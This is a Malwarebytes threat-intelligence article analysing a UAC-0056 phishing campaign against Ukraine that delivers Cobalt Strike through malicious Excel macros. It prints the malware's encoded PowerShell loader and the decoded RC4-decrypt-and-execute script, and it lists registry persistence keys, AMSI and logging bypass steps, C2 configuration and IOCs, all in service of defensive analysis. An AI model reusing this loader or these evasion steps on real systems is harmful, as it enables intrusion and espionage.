# Reference for threat actor for "SaintBear, Lorec53"

**Title**: Cobalt Strikes again: UAC-0056 continues to target Ukraine in its latest campaign

**Source**: https://blog.malwarebytes.com/threat-intelligence/2022/07/cobalt-strikes-again-uac-0056-continues-to-target-ukraine-in-its-latest-campaign/

## Content











Cobalt Strikes again: UAC-0056 continues to target Ukraine in its latest campaign











































 




 








Skip to content





Search

Search Malwarebytes.com



Search for:








Contact Us

Personal Support
Business Support
Talk to Sales
Contact Press
Partner Programs
Submit Vulnerability


Company

About Malwarebytes
Careers
News & Press


Sign In

MyAccount sign in: manage your personal or Teams subscription >
Cloud Console sign in: manage your cloud business products >
Partner Portal sign in: management for Resellers and MSPs >


 














Personal


< Personal

ProductsMalwarebytes Premium >Malwarebytes Privacy VPN >Malwarebytes Identity Theft Protection >Malwarebytes Browser Guard >Malwarebytes for Teams/small offices >AdwCleaner for Windows >

Find the right productSee our plansInfected already?Clean your device now




SolutionsFree antivirus >Free virus scan & removal >Windows antivirus >Mac antivirus >Android antivirus >iOS security >Chromebook antivirus >
See personal pricingManage your subscriptionVisit our support page 





Business


< Business
BUNDLESCorePrevent and remediate threats and identify vulnerabilitiesAdvancedUtilize threat guidance and patch management plus everything in CoreEliteDeploy Managed Detection and Response plus everything in AdvancedUltimateProtect against categories of malicious websites plus everything in Elite


TECHNOLOGY HIGHLIGHTSManaged Detection & Response (MDR) Deploy fully-managed threat monitoring, investigation, and remediationEndpoint Detection & Response (EDR)Prevent more attacks with security that catches what others missSecurity AdvisorVisualize and optimize your security posture in just minutesFor EducationSecure your students and institution against cyberattacks







Learn more about Security Advisor (available in every bundle) and see the full list of our products and services.
Full technology list >




Pricing



< Pricing
Personal pricingProtect your personal devices and dataSmall office/home office pricingProtect your team’s devices and dataBusiness pricingExplore our award-winning endpoint security products, from EP to EDR to MDR




Partners



< Partners
Explore PartnershipsPartner SolutionsResellersManaged Service ProvidersComputer RepairTechnology PartnersAffiliate PartnersContact Us




Resources


< Resources
Learn About CybersecurityAntivirusMalwareRansomwareMalwarebytes Labs – BlogGlossaryThreat Center


Business ResourcesReviewsAnalyst ReportsCase StudiesPress & News


ReportsThe State of Malware 2023 ReportRead report



Support



< Support
Technical SupportPersonal SupportBusiness SupportPremium ServicesForumsVulnerability DisclosureReport a False Positive


Featured ContentActivate Malwarebytes Privacy on Windows device.See Content Product Videos



 

Free Download




Search
Search

Search Malwarebytes.com



Search for:









































SUBSCRIBE


rss

































 


News
						 | 						Threat Intelligence

Cobalt Strikes again: UAC-0056 continues to target Ukraine in its latest campaign 
Posted: July 13, 2022
 by Threat Intelligence Team 


This blog was authored by Roberto Santos and Hossein Jazi
The Malwarebytes Threat Intelligence team recently reviewed a series of cyber attacks against Ukraine that we attribute with high confidence to UAC-0056 (AKA UNC2589, TA471). This threat group has repeatedly targeted the government entities in Ukraine via phishing campaigns following the same common tactics, techniques and procedures (TTPs).
Lures are based on important matters related to the ongoing war and humanitarian disaster happening in Ukraine. We have been closely monitoring this threat actor and noticed changes in their macro-based documents as well as their final payloads.
In this blog, we will connect the dots between different decoy samples that we and others such as Ukraine CERT have observed. We will also share indicators for a previously undocumented campaign performed by the same threat actor at the end of June.
Different themes, same techniques
Since the publication of our blog post There’s a Go Elephant in the room, we have tracked several new samples as can be seen in the timeline below:

Let’s dig further into those relationships. UA-CERT has attributed the document named “Information on the availability of vacancies and their staffing.xls” to UAC-0056. This file looked familiar to us and for good reason because the macro is nearly identical to the document we analyzed in our initial blog:

In the most recent attack reported by UA-CERT (Humanitarian catastrophe of Ukraine since February 24, 2022.xls) we see an almost identical macro to the one used in another decoy document called Help Ukraine.xls:

The Help Ukraine lure, to our knowledge, has never been publicly documented before:

We were able to identify 7 different samples with that theme, including one (258a9665af7120d0d80766c119e48a4035ee3b68676076bf3ed6462c644fe7d0) that has some similarities with a previous attack:

Also, in the past we have found comments regarding to a domain named ExcelVBA[.]ru. This document was contacting a suspiciously similar domain named excel-vba[.]ru.

Among victims, we find gov.ua emails being targeted. One of the texts used as email body in the last campaign was written in Ukrainian and translates to:

On February 24, 2022, the army of the terrorist state – the Russian Federation, intervened on the territory of Ukraine. In order to counter the propaganda of the Russian government, the State Department of Statistics at the Office of the President of Ukraine prepared a consolidated report on the dead citizens of Ukraine, on the citizens of Ukraine who were left without a home, on the citizens of Ukraine who lost their jobs, on the number of destroyed homes, on the number of destroyed businesses as a result of an act of aggression . This report shows all the data broken down by regions of Ukraine. Familiarize yourself and familiarize your colleagues with the real state of affairs. Glory to Ukraine!
Translation of original email sent to victims
We will focus our analysis on these 3 newer templates. Exact names and paths are from 024054ff04e0fd75a4765dd705067a6b336caa751f0a804fefce787382ac45c1 (Information on the availability of vacancies and their staffing.xls). The analysis is still valid for the others, while minor changes exist between samples.
write.bin
The document will download an executable file named write.bin. Other attacks following the same scheme used different names for this file, including Office.exe, baseupd.exe and DataSource.exe. The file is slightly obfuscated, and performs the following actions:
Establishing persistence
After some antidebug tricks, the registry key HKCUSoftwareMicrosoftWindowsCurrentVersionRunCheck License is used to establish persistence. 

HKCUSoftwareMicrosoftWindowsCurrentVersionRunUpdate Checker

, is checked first because that was the key used by previous versions of the malware.




Dropping next stage
Next step is dropping a file in C:ProgramDataTRYxaEbX.  This file will be used later.

The payload will execute the following powershell Base64 encoded command:
JABBADEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAiAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAFQAUgBZAHgAYQBFAGIAWAAiACkAOwAKACQAQgAxACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQB0AGUAcwAoACIAQwBtAEEASgBuAGcAdgBkAEQAbQBpAFQAagBMAHgATgAiACkAOwAKACQAQQA9AHsAJABXACwAJABZAD0AJABBAHIAZwBzADsAJABYAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAFoAPQAoACQAWgArACQAWABbACQAXwBdACsAJABZAFsAJABfACUAJABZAC4ATABlAG4AZwB0AGgAXQApACUAMgA1ADYAOwAkAFgAWwAkAF8AXQAsACQAWABbACQAWgBdAD0AJABYAFsAJABaAF0ALAAkAFgAWwAkAF8AXQB9ADsAJABXAHwAJQB7ACQAVQA9ACgAJABVACsAMQApACUAMgA1ADYAOwAkAFYAPQAoACQAVgArACQAWABbACQAVQBdACkAJQAyADUANgA7ACQAWABbACQAVQBdACwAJABYAFsAJABWAF0APQAkAFgAWwAkAFYAXQAsACQAWABbACQAVQBdADsAJABfAC0AYgB4AG8AcgAkAFgAWwAoACQAWABbACQAVQBdACsAJABYAFsAJABWAF0AKQAlADIANQA2AF0AfQB9ADsACgAkAEMAIAA9ACAAKAAmACAAJABBACAAJABBADEAIAAkAEIAMQApADsACgAkAEUAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAEMALAAwACwAJABDAC4ATABlAG4AZwB0AGgAKQA7AAoAJABFACAAPQAgACQARQAgAC0AUwBwAGwAaQB0ACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoATgBlAHcATABpAG4AZQA7AAoAZgBvAHIAZQBhAGMAaAAoACQARQBFACAAaQBuACAAJABFACkAewBpAGUAeAAgACQAKAAkAEUARQArACIAOwAiACkAOwB9ADsA

The chunk before is Base64 encoded; which decodes to:
$A1 = [System.IO.File]::ReadAllBytes("C:ProgramDataTRYxaEbX");
$A={$W,$Y=$Args;$X=0..255;0..255|%{$Z=($Z+$X[$_]+$Y[$_%$Y.Length])%256;$X[$_],$X[$Z]=$X[$Z],$X[$_]};$W|%{$U=($U+1)%256;$V=($V+$X[$U])%256;$X[$U],$X[$V]=$X[$V],$X[$U];$_-bxor$X[($X[$U]+$X[$V])%256]}};
$C = (& $A $A1 $B1);
$E = (New-Object -TypeName System.Text.UTF8Encoding).GetString($C,0,$C.Length);
$E = $E -Split [Environment]::NewLine;
foreach($EE in $E){iex $($EE+";");};
In short the file dropped in C:ProgramDataTRYxaEbX will be decrypted using 

CmAJngvdDmiTjLxN

 as key using the RC4 algorithm. This next PowerShell script will look like:




Here we can see some of the actions that will be taken:

Disable script logging
Disable Module Logging
Disable Transcription
Disable AMSI protection

After this step, another Base64 payload is decoded and executed:

Cobalt Strike payload deployed
As it can be seen, the main functionality provided by this second PowerShell file is to inject shellcode. This shellcode can be 32 or 64 bit, and is a Cobalt Strike beacon with the following configuration:
BeaconType                    – HTTPS
Port                              – 443
SleepTime                       – 30000
PublicKey_MD5              – defb5d95ce99e1ebbf421a1a38d9cb64
C2Server                         – skreatortemp.site,/s/08u1XdxChhMrLYdTasfnOMQpbsLkpq3o/field-keywords/
UserAgent                       – Mozilla/5.0_Frsg_stredf_o21_rutyyyrui_type (Windows NT 10.0; Win64; x64; Trident/7.0; D-M1-200309AC;D-M1-MSSP1; rv:11.0) like Gecko_10984gap
HttpPostUri                    – /nBz07hg5l3C9wuWVCGV-5xHHu1amjf76F2A8i/avp/amznussraps/
Watermark                      – 1580103824
By having a Cobalt Strike instance running on the victim’s machine, it is now fully compromised.
Attacker probes the sandbox
At the time of writing, malicious C&C servers seem to be down. However, on July 5 we saw active servers and successful connections to our test environment. The attackers actively sent reconnaissance commands to the machine, listing the content of several folders.
We were able to decode the network communications using Didier Steven’s excellent collection of Cobalt Strike tools.

We consider these actions preliminary moves to check whether the machine is a viable target or not before following up with other actions.
Attribution to UAC-0056
Based on recent attacks reported by CERT UA, as well as the similarities indicated at the beginning of the blog, we can attribute this attack with high confidence to UAC-0056.
Signatures contained in the Cobalt Strike beacons (watermark 1580103824 and public key 

defb5d95ce99e1ebbf421a1a38d9cb64

), may be used to connect the attack to other groups. For instance, the public key should be unique among deployments, according to the CobaltStrike documentation.



However, it is important to note that in that case we cannot simply rely on a public key to attribute the sample we analyzed in this report. In fact, these signatures have been attributed to many different groups. Our assessment is that the group used a leaked version of Cobalt Strike and used the same private key as others, making attribution harder.
Malwarebytes users were protected against this campaign thanks to our Anti-Exploit layer.

IOCs
Malicious Excel documents (Help Ukraine template)
fe3bc87b433e51e0713d80e379a61916ceb6007648b0fde1c44491ba44dc1cb3c9675483ab362bc656a9f682928b6a0c3ff60a274ade3ceabac332069480605a1b95186ecc081911c3a80f278e4ed34ee9ef3a46f5cf1ae8573ac3a4c69df532258a9665af7120d0d80766c119e48a4035ee3b68676076bf3ed6462c644fe7d0e663bb4d9506e7c09bcf7b764d31b61d8f7dbae0b64dd4ef4e9d282e1909d386ecd2bb648a9ad28069c1ec4c0da546507797fdf0243e9e5eece581bf702675ffeac9a4d9b63a0ca68194eae433d6b2e9a4531b60b82faf218b8dd4b69cec09df
Malicious Excel documents (Humanitarian template)
024054ff04e0fd75a4765dd705067a6b336caa751f0a804fefce787382ac45c114736be09a7652d206cd6ab35375116ec4fad499bb1b47567e4fd56dcfcd22ea474a0f0bb5b17a1bb024e08a0bb46277ba03392ee95766870c981658c4c2300d
Payloads
0709a8f18c8436deea0b57deab55afbcea17657cb0186cbf0f6fcbb551661470aadd8c7c248915c5da49c976f24aeb98ccc426fb31d1d6913519694a7bb9351afb2a9dcfcf41c493fb7348ff867bb3cad9962a04c9dfd5b1afa115f7ff737346501d4741a0aa8784e9feeb9f960f259c09cbceccb206f355209c851b7f094eff
Cobalt Strike beacon and payloads
136.144.41[.]177syriahr[.]eu/s/Xnk75JwUcIebkrmENtufIiiKEmoqBN/field-keywords/syriahr[.]eu/nzXlLVas-VALvDh9lopkC/avp/amznussraps/skreatortemp[.]siteimolaoggi[.]eu




SHARE THIS ARTICLE
































RELATED ARTICLES





 



News
																	 | 																	Privacy

Facebook Marketplace users’ stolen data offered for sale


February 15, 2024 - Personal data belonging to 200,000 Facebook Marketplace users has been published online, including email addresses and phone numbers.

CONTINUE READING
 0 Comments






 



Cybercrime
																	 | 																	Ransomware
																	 | 																	Threats

How ransomware changed in 2023


February 14, 2024 - In 2023, the CL0P ransomware gang broke the scalability barrier and shook the security world with a series of short, automated campaigns.

CONTINUE READING
 0 Comments






 



News
																	 | 																	Personal

Malwarebytes crushes malware all the time


February 14, 2024 - The PC Security Channel tested Malwarebytes against 2015 files.  Here's how we did.

CONTINUE READING
 0 Comments






 



Exploits and vulnerabilities
																	 | 																	News

Update now! Microsoft fixes two zero-days on February Patch Tuesday


February 14, 2024 - Microsoft has issued patches for 73 security vulnerabilities in its February 2024 Patch Tuesday.

CONTINUE READING
 0 Comments






 



Android
																	 | 																	News
																	 | 																	Personal

TheTruthSpy stalkerware, still insecure, still leaking data


February 13, 2024 - Stalkerware app TheTruthSpy has been hacked for the fourth time, once again leaking the sensitive data it captures.

CONTINUE READING
 0 Comments










ABOUT THE AUTHOR









Threat Intelligence Team













Contributors



Threat Center



Podcast



Glossary



Scams










 

					Cyberprotection for every one.					



FOR PERSONAL
Windows Antivirus
Mac Antivirus
Android Antivirus
Free Antivirus
VPN App (All Devices)
Malwarebytes for iOS
SEE ALL

COMPANY
About Us
Contact Us
Careers
News and Press
Blog
Scholarship
Forums
 

FOR BUSINESS
Small Businesses
Mid-size business
Larger Enterprise
Endpoint Protection
Endpoint Detection & Response
Managed Detection and Response (MDR)

FOR PARTNERS
Managed Service Provider (MSP) Program
Resellers

MY ACCOUNT
Sign In


SOLUTIONS
Rootkit Scanner
Trojan Scanner
Virus Scanner
Spyware Scanner
Password Generator
Anti Ransomware Protection

ADDRESS
One Albert Quay2nd FloorCork T12 X8N6Ireland
3979 Freedom Circle12th FloorSanta Clara, CA 95054


LEARN
Malware
Hacking
Phishing
Ransomware
Computer Virus
Antivirus
What is VPN?
 




 Twitter




 Facebook




 LinkedIn




 Youtube




 Instagram




Cybersecurity info you can’t live without
Want to stay informed on the latest news in cybersecurity? Sign up for our newsletter and learn how to protect your computer from threats.


Email Address



















English


Legal
Privacy
Accessibility
Vulnerability Disclosure
Terms of Service
 
						© 2024 All Rights Reserved						










Select your language








































